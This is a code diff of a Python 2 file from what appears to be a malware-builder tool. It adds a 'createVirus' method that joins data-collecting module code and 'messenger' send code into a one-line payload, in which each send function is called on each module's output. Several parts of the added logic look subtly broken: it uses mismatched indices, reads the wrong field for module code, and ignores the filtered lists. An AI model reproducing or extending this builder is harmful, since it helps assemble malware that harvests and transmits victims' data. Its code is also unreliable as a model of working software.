@@ -10,6 +10,7 @@ ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
 ignoreEnds = ["pyc"]
 supportedOS = ["Windows", "Darwin", "*"]
 
+
 class utils():
     @staticmethod
     def checkFile(fileLines, sender = False):
@@ -100,11 +101,13 @@ class utils():
             info["info"] = "Error"
             print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
         return info
+
     @staticmethod
     def checkModule(info, file):
         return utils.checkContent(
             utils.checkModuleInt(info, file), 
             file)
+
     @staticmethod
     def checkSendInt(info, file):
         try:
@@ -126,12 +129,11 @@ class utils():
                         elif reReceiveFunc.findall(funcCode):
                             funcName = 'receive%s%s' % (
                                 info["name"], str(random.randint(0,2000)))
-                            receiveCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
+                            receiveCode = onelinerize(reReceiveFunc.sub('def %s(' % funcName,
                                 funcCode))
                             exec(receiveCode)
                             info["receiveCode"] = receiveCode
                             info["receiveCodeFunc"] = funcName
-
                 except:
                     info["success"] = 4
                     info["info"] = "Error"
@@ -157,6 +159,20 @@ class utils():
         return utils.checkContent(
             utils.checkSendInt(info, file), 
             file)
+
+    @staticmethod
+    def checkAva(module, info):
+        moduleNames = [x["name"] for x in info]
+        if module in moduleNames:
+            for i in info:
+                if i["name"] == module:
+                    if i["success"] == 0:
+                        return True
+                    else:
+                        print "[!] Module %s is not available, ignored" % module
+                        return False
+        print "[!] Module %s is not available, ignored" % module
+        return False
 
 
 class API():
@@ -190,7 +206,36 @@ class API():
                         ))
         return sendInfo
 
-print API.getSendInfo()
+    @staticmethod
+    def createVirus(moduleList, sendList, path = None, 
+        sendPath = 'messenger',
+        modulePath = "module"):
+        moduleInfo = API.getModuleInfo(modulePath)
+        sendInfo = API.getSendInfo(sendPath)
+        realModuleList = []
+        realSendList = []
+        for send in enumerate(sendList):
+            if utils.checkAva(send[1], sendInfo):
+                realSendList.append(sendInfo[send[0]])
+
+        for module in enumerate(moduleList):
+            if utils.checkAva(module[1], moduleInfo):
+                realModuleList.append(moduleInfo[module[0]])
+        moduleCode = ""
+        sendCode = ""
+        execCode = ""
+        for realModule in realModuleList:
+            moduleCode += "%s;" % (realModule["sendCode"])
+        for realSend in realSendList:
+            sendCode += "%s;" % (realSend["sendCode"])
+        for i in moduleInfo:
+            for j in sendInfo:
+                execCode += "%s(%s(), '%s');" % (
+                    j["sendCodeFunc"], i["sendCodeFunc"], 
+                    i["name"])
+
+        return moduleCode + sendCode + execCode
+
 
 class beautify():
     @staticmethod
@@ -217,4 +262,3 @@ class beautify():
     def getSendInfo(path='messenger'):
         info = API.getModuleInfo(path)
         return beautify.b(info)
-        
